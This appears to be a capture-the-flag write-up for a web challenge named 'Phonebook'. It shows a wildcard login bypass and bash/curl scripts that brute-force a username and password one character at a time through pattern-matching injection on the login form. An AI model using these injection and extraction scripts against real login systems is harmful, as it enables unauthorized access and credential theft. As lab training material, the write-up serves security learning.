# Phonebook

> **Who is lucky enough to be included in the phonebook?**

## Login

`sqlmap` finds nothing.

Let's fuzz with special characters and see if there's room for template injection.

First, replay a browser request:

```bash
curl -i -s -k -X POST \
  -H $'Content-Type: application/x-www-form-urlencoded' \
  --data-binary $'username=admin&password=admin' \
  $'http://206.189.20.127:31677/login'
```

The server gives an empty reply in all cases; the only distinction between
an authentication failure and a success is in the header:

```
Location: /login?message=Authentication%20failed
```

So we cannot use `ffuf` because it filters / matches according to the response
body; it has no option to parse the response header.

With curl:

```bash
while read c; do
curl -i -s -k -X POST \
  --data-binary "username=${c}&password=*" \
  $'http://206.189.20.127:31677/login';
done </usr/share/wordlists/fuzzing/special-chars.txt
```

Anyway, we can bypass the login with `*` and `)` returns a 500, internal error.

## Search

Once logged, we can query the phonebook. The data does not contain outstanding.

The webpage is very dry, with a single search functionality.

Looking into the JS, there may be a potential for an insecure deserialization
on the server side: 

```javascript
function search(form) {
  var searchObject = new Object();
  searchObject.term = $("#searchfield").val();
  $.ajax({
    type: "POST",
    url: "/search",
    data: JSON.stringify(searchObject),
    success: success,
    dataType: "json",
});
};
```

## Bruteforcing

### Algorithm

May-be the wildcard bypass got us logged as a random user, something like the first
match from a database.

Our previous fuzzing technique is actually performing pattern matching against
the user and password.

In particular, it can determine if either the password / username:

- start with a given prefix: `"username=${prefix}*&password=*"`
- contain a given character: `"username=*${character}*&password=*"`

The algorithm follows:

1) Bruteforce the username:
  - build an alphabet with only the characters found in the username
  - expose the username character by character
2) Bruteforce the password:
  - build an alphabet with only the characters found in the password
  - expose the password character by character

### Optimizing the alphabets

We start with most alphanumeric characters:

```bash
alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_{}'
```

The operations on the username and the password are identical, they can be
wrapped in a function:

```bash
credentials_match() {
    return $(curl -i -s -k -X POST \
        --data "username=${1}&password=${2}" \
        $'http://206.189.20.127:31677/login' |
        grep -ia failed)
}
```

Then the alphabet is determined with:

```bash
for i in {0..65}; do
    trying=${alphabet:${i}%66:1};
    isinside=$(credentials_match "*${trying}*" "*");
    if [[ -z "$isinside" ]]; then username_alphabet+="${trying}"; echo "[+]${trying}"; fi
done
```

Same for the password.

### Iterating

The password is exposed character after character thanks to the pattern:

```bash
isinside=$(credentials_match "*" "${current_password}${trying}*");
```

I couldn't pass the brackets to my function, so I hardcoded the start.